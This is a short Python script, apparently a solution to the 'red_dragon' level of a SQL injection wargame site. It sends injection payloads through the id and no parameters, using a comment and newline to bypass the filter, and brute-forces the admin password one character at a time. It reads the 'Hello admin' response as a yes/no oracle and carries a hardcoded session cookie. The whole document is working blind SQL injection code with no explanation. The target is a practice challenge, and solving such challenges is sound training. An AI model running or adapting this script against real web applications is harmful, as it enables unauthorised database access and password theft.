import requests

url='http://los.rubiya.kr/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php'
hdr={'Cookie' : 'PHPSESSID=6optmh25vffbnofejhq87sm1b4'}
answer=''
while True:
    for i in range(33,127):
        data="?id='||pw<%23&no=%0a0x"+str(answer)+str(hex(i).replace("0x",""))+""
        re=requests.get(url+data,headers=hdr)
        print(data)

        if re.text.find("Hello admin") != -1:
            answer+=str(hex(i-1).replace("0x",""))
            print(answer)
            break;
        
